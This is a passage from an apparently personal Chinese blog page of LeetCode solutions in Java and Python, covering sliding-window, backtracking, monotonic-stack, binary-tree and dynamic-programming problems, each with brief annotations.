class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="76-最小覆盖子串-经典滑动窗口⭐"><a href="#76-最小覆盖子串-经典滑动窗口⭐" class="headerlink" title="76. 最小覆盖子串__经典滑动窗口⭐"></a><a href="https://leetcode-cn.com/problems/minimum-window-substring/" target="_blank" rel="noopener">76. 最小覆盖子串</a>__经典滑动窗口⭐</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">minWindow</span><span class="params">(String s, String t)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span>[] sc=s.toCharArray();</span><br><span class="line">        <span class="keyword">int</span> cnt=t.length();</span><br><span class="line">        HashMap&lt;Character,Integer&gt; map=<span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">char</span> x:t.toCharArray())&#123;</span><br><span class="line">            <span class="keyword">if</span>(map.get(x)==<span class="keyword">null</span>)&#123;</span><br><span class="line">                map.put(x,<span class="number">1</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                map.put(x,map.get(x)+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> tmpcnt=<span class="number">0</span>,minlen= Integer.MAX_VALUE,minl=<span class="number">0</span>,minr=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;j&lt;sc.length;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(map.get(sc[j])!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(map.get(sc[j])&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                    tmpcnt+=<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                map.put(sc[j],map.get(sc[j])-<span class="number">1</span>); </span><br><span class="line">                <span class="keyword">while</span>(i&lt;sc.length &amp;&amp; tmpcnt==cnt)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(minlen&gt;j-i+<span class="number">1</span>)&#123;</span><br><span class="line">                        minlen=j-i+<span class="number">1</span>;</span><br><span class="line">                        minl=i;</span><br><span class="line">                        minr=j;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(map.get(sc[i])!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                        <span class="keyword">if</span>(map.get(sc[i])==<span class="number">0</span>)&#123;</span><br><span class="line">                            tmpcnt--;</span><br><span class="line">                        &#125;</span><br><span class="line">                        map.put(sc[i],map.get(sc[i])+<span class="number">1</span>); </span><br><span class="line">                    &#125;</span><br><span class="line">                    i++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(minlen==Integer.MAX_VALUE) <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">return</span> s.substring(minl,minr+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="79-单词搜索-经典图回溯⭐"><a href="#79-单词搜索-经典图回溯⭐" class="headerlink" title="79. 单词搜索 经典图回溯⭐"></a><a href="https://leetcode-cn.com/problems/word-search/" target="_blank" rel="noopener">79. 单词搜索</a> 经典图回溯⭐</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">exist</span><span class="params">(<span class="keyword">char</span>[][] board, String word)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; board.length; i++)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; board[<span class="number">0</span>].length; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (search(board, word, i, j,<span class="number">0</span>)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>  <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">search</span><span class="params">(<span class="keyword">char</span>[][] board,String word,<span class="keyword">int</span> i,<span class="keyword">int</span> j,<span class="keyword">int</span> k)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(k&gt;=word.length()) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(i&lt;<span class="number">0</span>||i&gt;=board.length||j&lt;<span class="number">0</span>||j&gt;=board[<span class="number">0</span>].length||board[i][j]!=word.charAt(k)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        board[i][j]+=<span class="number">256</span>;</span><br><span class="line">        <span class="keyword">boolean</span> result=search(board,word,i-<span class="number">1</span>,j,k+<span class="number">1</span>) || search(board,word,i+<span class="number">1</span>,j,k+<span class="number">1</span>) || search(board,word,i,j-<span class="number">1</span>,k+<span class="number">1</span>) || search(board,word,i,j+<span class="number">1</span>,k+<span class="number">1</span>);</span><br><span class="line">        board[i][j]-=<span class="number">256</span>;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="78-子集-经典回溯"><a href="#78-子集-经典回溯" class="headerlink" title="78. 子集__经典回溯"></a><a href="https://leetcode-cn.com/problems/subsets/" target="_blank" rel="noopener">78. 子集</a>__经典回溯</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; subsets(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res=<span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="comment">//res.add(new ArrayList&lt;&gt;());</span></span><br><span class="line">        backtrace(res,<span class="number">0</span>,nums,<span class="keyword">new</span> ArrayList&lt;&gt;());</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">backtrace</span><span class="params">(List&lt;List&lt;Integer&gt;&gt; res,<span class="keyword">int</span> pos,<span class="keyword">int</span>[] nums,List&lt;Integer&gt; tmp)</span></span>&#123;</span><br><span class="line">        res.add(<span class="keyword">new</span> ArrayList&lt;&gt;(tmp));</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=pos;i&lt;nums.length;i++)&#123;</span><br><span class="line">            tmp.add(nums[i]);</span><br><span class="line">            backtrace(res,i+<span class="number">1</span>,nums,tmp);</span><br><span class="line">            tmp.remove(tmp.size()-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="84-柱状图中最大的矩形-单调栈经典⭐⭐"><a href="#84-柱状图中最大的矩形-单调栈经典⭐⭐" class="headerlink" title="84. 柱状图中最大的矩形__单调栈经典⭐⭐"></a><a href="https://leetcode-cn.com/problems/largest-rectangle-in-histogram/" target="_blank" rel="noopener">84. 柱状图中最大的矩形</a>__单调栈经典⭐⭐</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">largestRectangleArea</span><span class="params">(self, heights: List[int])</span> -&gt; int:</span></span><br><span class="line">        heights=[<span class="number">0</span>]+heights+[<span class="number">0</span>] <span class="comment">#第一个零是为了stack[-1]时必退出while循环，第二个零时把最后栈中的元素全部弹出计算</span></span><br><span class="line">        stack=[]</span><br><span class="line">        res=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(heights)):</span><br><span class="line">            <span class="keyword">while</span> stack <span class="keyword">and</span> heights[stack[<span class="number">-1</span>]]&gt;heights[i]:</span><br><span class="line">                tmp=stack.pop()</span><br><span class="line">                res=max(res,(i-stack[<span class="number">-1</span>]<span class="number">-1</span>)*heights[tmp]) <span class="comment">#其实就是左右找到tmp的小界</span></span><br><span class="line">            stack.append(i)</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">largestRectangleArea</span><span class="params">(<span class="keyword">int</span>[] heights)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        Stack&lt;Integer&gt; stack=<span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">        <span class="keyword">int</span>[] nh=<span class="keyword">new</span> <span class="keyword">int</span>[heights.length+<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;nh.length-<span class="number">1</span>;i++) nh[i]=heights[i-<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nh.length;i++)&#123;</span><br><span class="line">            <span class="keyword">while</span>(!stack.isEmpty() &amp;&amp; nh[stack.peek()]&gt;nh[i])&#123;</span><br><span class="line">                <span class="keyword">int</span> tmp=stack.pop();</span><br><span class="line">                res=Math.max(res,(i-stack.peek()-<span class="number">1</span>)*nh[tmp]);</span><br><span class="line">            &#125;</span><br><span class="line">            stack.push(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="85-最大矩形-在上一题之上的改进"><a href="#85-最大矩形-在上一题之上的改进" class="headerlink" title="85. 最大矩形__在上一题之上的改进"></a><a href="https://leetcode-cn.com/problems/maximal-rectangle/" target="_blank" rel="noopener">85. 最大矩形</a>__在上一题之上的改进</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maximalRectangle</span><span class="params">(self, matrix)</span> -&gt; int:</span></span><br><span class="line">        <span class="keyword">if</span> len(matrix)==<span class="number">0</span>: <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        heights=[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(len(matrix[<span class="number">0</span>]))]</span><br><span class="line">        res=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(matrix)):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(len(matrix[<span class="number">0</span>])):</span><br><span class="line">                <span class="keyword">if</span> matrix[i][j]==<span class="string">"0"</span>:</span><br><span class="line">                    heights[j]=<span class="number">0</span></span><br><span class="line">                <span class="keyword">else</span>: heights[j]+=<span class="number">1</span></span><br><span class="line">            res=max(res,self.largestRectangleArea(heights))</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">largestRectangleArea</span><span class="params">(self, heights)</span>:</span></span><br><span class="line">        heights.append(<span class="number">0</span>)</span><br><span class="line">        stack = []</span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(heights)):</span><br><span class="line">            <span class="keyword">while</span> stack <span class="keyword">and</span> heights[i] &lt; heights[stack[<span class="number">-1</span>]]:</span><br><span class="line">                s = stack.pop()</span><br><span class="line">                res = max(res, heights[s] * ((i - stack[<span class="number">-1</span>] - <span class="number">1</span>) <span class="keyword">if</span> stack <span class="keyword">else</span> i))</span><br><span class="line">            stack.append(i)</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>



<h1 id="94-二叉树的中序遍历-非递归中序"><a href="#94-二叉树的中序遍历-非递归中序" class="headerlink" title="94. 二叉树的中序遍历__非递归中序"></a><a href="https://leetcode-cn.com/problems/binary-tree-inorder-traversal/" target="_blank" rel="noopener">94. 二叉树的中序遍历</a>__非递归中序</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">inorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        List&lt;Integer&gt; list=<span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        Stack&lt;TreeNode&gt; stack=<span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">        TreeNode cur=root;</span><br><span class="line">        <span class="keyword">while</span>(cur!=<span class="keyword">null</span> || !stack.isEmpty())&#123;</span><br><span class="line">            <span class="keyword">while</span>(cur!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                stack.push(cur);</span><br><span class="line">                cur=cur.left;</span><br><span class="line">            &#125;</span><br><span class="line">            cur=stack.pop();</span><br><span class="line">            list.add(cur.val);</span><br><span class="line">            cur=cur.right;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="96-不同的二叉搜索树"><a href="#96-不同的二叉搜索树" class="headerlink" title="96. 不同的二叉搜索树"></a><a href="https://leetcode-cn.com/problems/unique-binary-search-trees/" target="_blank" rel="noopener">96. 不同的二叉搜索树</a></h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">numTrees</span><span class="params">(self, n: int)</span> -&gt; int:</span></span><br><span class="line">        dp=[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(n+<span class="number">1</span>)]</span><br><span class="line">        dp[<span class="number">0</span>]=dp[<span class="number">1</span>]=<span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,n+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,i+<span class="number">1</span>):</span><br><span class="line">                dp[i]+=dp[j<span class="number">-1</span>]*dp[i-j]</span><br><span class="line">        <span class="keyword">return</span> dp[n]</span><br><span class="line">        <span class="comment"># dp[n]=dp[0]*dp[n-1]+dp[1]*dp[n-2]+...+dp[n-1]*dp[0]</span></span><br></pre></td></tr></table></figure>



<h1 id="101-对称二叉树"><a href="#101-对称二叉树" class="headerlink" title="101. 对称二叉树"></a>101. 对称二叉树</h1><p><a href="https://leetcode-cn.com/problems/symmetric-tree/" target="_blank" rel="noopener">101. 对称二叉树</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Definition <span class="keyword">for</span> a binary tree node.</span><br><span class="line"> * public class TreeNode &#123;</span><br><span class="line"> *     int val;</span><br><span class="line"> *     TreeNode left;</span><br><span class="line"> *     TreeNode right;</span><br><span class="line"> *     TreeNode(int x) &#123; val = x; &#125;</span><br><span class="line"> * &#125;</span><br><span class="line"> */</span><br><span class="line">class Solution &#123;</span><br><span class="line">    public boolean isSymmetric(TreeNode root) &#123;</span><br><span class="line">        <span class="keyword">return</span> root==null || cmp(root.left,root.right);</span><br><span class="line">    &#125;</span><br><span class="line">    public boolean cmp(TreeNode l,TreeNode r)&#123;</span><br><span class="line">        <span class="keyword">if</span>(l==null &amp;&amp; r==null) <span class="keyword">return</span> true;</span><br><span class="line">        <span class="keyword">if</span>(l==null || r==null) <span class="keyword">return</span> false;</span><br><span class="line">        <span class="keyword">return</span> l.val==r.val &amp;&amp; cmp(l.right,r.left) &amp;&amp; cmp(l.left,r.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="104-二叉树的最大深度"><a href="#104-二叉树的最大深度" class="headerlink" title="104. 二叉树的最大深度"></a><a href="https://leetcode-cn.com/problems/maximum-depth-of-binary-tree/" target="_blank" rel="noopener">104. 二叉树的最大深度</a></h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) &#123; val = x; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxDepth</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> root==<span class="keyword">null</span>?<span class="number">0</span>:Math.max(maxDepth(root.left),maxDepth(root.right))+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="105-从前序与中序遍历序列构造二叉树-常见的分治"><a href="#105-从前序与中序遍历序列构造二叉树-常见的分治" class="headerlink" title="105. 从前序与中序遍历序列构造二叉树__常见的分治"></a><a href="https://leetcode-cn.com/problems/construct-binary-tree-from-preorder-and-inorder-traversal/" target="_blank" rel="noopener">105. 从前序与中序遍历序列构造二叉树</a>__常见的分治</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) &#123; val = x; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> TreeNode <span class="title">buildTree</span><span class="params">(<span class="keyword">int</span>[] preorder, <span class="keyword">int</span>[] inorder)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preorder.length==<span class="number">0</span>||inorder.length==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        TreeNode root=<span class="keyword">new</span> TreeNode (preorder[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;preorder.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(preorder[<span class="number">0</span>]==inorder[i])&#123;</span><br><span class="line">                root.left=buildTree(Arrays.copyOfRange(preorder,<span class="number">1</span>,i+<span class="number">1</span>),Arrays.copyOfRange(inorder,<span class="number">0</span>,i));</span><br><span class="line">                root.right=buildTree(Arrays.copyOfRange(preorder,i+<span class="number">1</span>,preorder.length),Arrays.copyOfRange(inorder,i+<span class="number">1</span>,inorder.length))</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="128-最长连续序列-神奇的处理⭐"><a href="#128-最长连续序列-神奇的处理⭐" class="headerlink" title="128. 最长连续序列__神奇的处理⭐"></a><a href="https://leetcode-cn.com/problems/longest-consecutive-sequence/" target="_blank" rel="noopener">128. 最长连续序列</a>__神奇的处理⭐</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">longestConsecutive</span><span class="params">(self, nums: List[int])</span> -&gt; int:</span></span><br><span class="line">        d=dict()</span><br><span class="line">        res=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> nums:</span><br><span class="line">            <span class="keyword">if</span> num <span class="keyword">not</span> <span class="keyword">in</span> d:</span><br><span class="line">                left=d.get(num<span class="number">-1</span>,<span class="number">0</span>)</span><br><span class="line">                right=d.get(num+<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">                maxv=left+right+<span class="number">1</span></span><br><span class="line">                res=max(res,maxv)</span><br><span class="line">                d[num]=maxv</span><br><span class="line">                d[num-left]=maxv</span><br><span class="line">                d[num+right]=maxv <span class="comment">#这里处理的很妙，顺延长度</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>

<h1 id="155-最小栈-单调递减栈的基础应用"><a href="#155-最小栈-单调递减栈的基础应用" class="headerlink" title="155. 最小栈__单调递减栈的基础应用"></a><a href="https://leetcode-cn.com/problems/min-stack/" target="_blank" rel="noopener">155. 最小栈</a>__单调递减栈的基础应用</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MinStack</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        initialize your data structure here.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        self.stack=[]</span><br><span class="line">        self.s2=[]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">push</span><span class="params">(self, x: int)</span> -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">        <span class="keyword">if</span> len(self.s2)==<span class="number">0</span> <span class="keyword">or</span> (self.s2 <span class="keyword">and</span> self.s2[<span class="number">-1</span>]&gt;=x): self.s2.append(x)</span><br><span class="line">        self.stack.append(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pop</span><span class="params">(self)</span> -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">        <span class="keyword">if</span> len(self.stack)==<span class="number">0</span>: <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">        <span class="keyword">if</span> self.stack[<span class="number">-1</span>]==self.s2[<span class="number">-1</span>]: self.s2.pop()</span><br><span class="line">        <span class="keyword">return</span> self.stack.pop()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">top</span><span class="params">(self)</span> -&gt; int:</span></span><br><span class="line">        <span class="keyword">if</span> len(self.stack)==<span class="number">0</span>: <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">        <span class="keyword">return</span> self.stack[<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getMin</span><span class="params">(self)</span> -&gt; int:</span></span><br><span class="line">        <span class="keyword">if</span> self.s2: <span class="keyword">return</span> self.s2[<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">else</span>: <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Your MinStack object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"># obj = MinStack()</span></span><br><span class="line"><span class="comment"># obj.push(x)</span></span><br><span class="line"><span class="comment"># obj.pop()</span></span><br><span class="line"><span class="comment"># param_3 = obj.top()</span></span><br><span class="line"><span class="comment"># param_4 = obj.getMin()</span></span><br></pre></td></tr></table></figure>



<h1 id="160-相交链表-简单的数学"><a href="#160-相交链表-简单的数学" class="headerlink" title="160. 相交链表__简单的数学"></a><a href="https://leetcode-cn.com/problems/intersection-of-two-linked-lists/" target="_blank" rel="noopener">160. 相交链表</a>__简单的数学</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * public class ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) &#123;</span></span><br><span class="line"><span class="comment"> *         val = x;</span></span><br><span class="line"><span class="comment"> *         next = null;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">getIntersectionNode</span><span class="params">(ListNode headA, ListNode headB)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(headA==<span class="keyword">null</span>||headB==<span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        ListNode pA=headA,pB=headB;</span><br><span class="line">        <span class="keyword">while</span>(pA!=pB)&#123;</span><br><span class="line">            pA=pA!=<span class="keyword">null</span>?pA.next:headB;</span><br><span class="line">            pB=pB!=<span class="keyword">null</span>?pB.next:headA;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pA;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="617-合并二叉树-简单递归"><a href="#617-合并二叉树-简单递归" class="headerlink" title="617. 合并二叉树__简单递归"></a><a href="https://leetcode-cn.com/problems/merge-two-binary-trees/" target="_blank" rel="noopener">617. 合并二叉树</a>__简单递归</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) &#123; val = x; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> TreeNode <span class="title">mergeTrees</span><span class="params">(TreeNode t1, TreeNode t2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(t1==<span class="keyword">null</span> &amp;&amp; t2==<span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(t1==<span class="keyword">null</span>) <span class="keyword">return</span> t2;</span><br><span class="line">        <span class="keyword">if</span>(t2==<span class="keyword">null</span>) <span class="keyword">return</span> t1;</span><br><span class="line">        t2.val+=t1.val;</span><br><span class="line">        t2.left=mergeTrees(t1.left,t2.left);</span><br><span class="line">        t2.right=mergeTrees(t1.right,t2.right);</span><br><span class="line">        <span class="keyword">return</span> t2;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

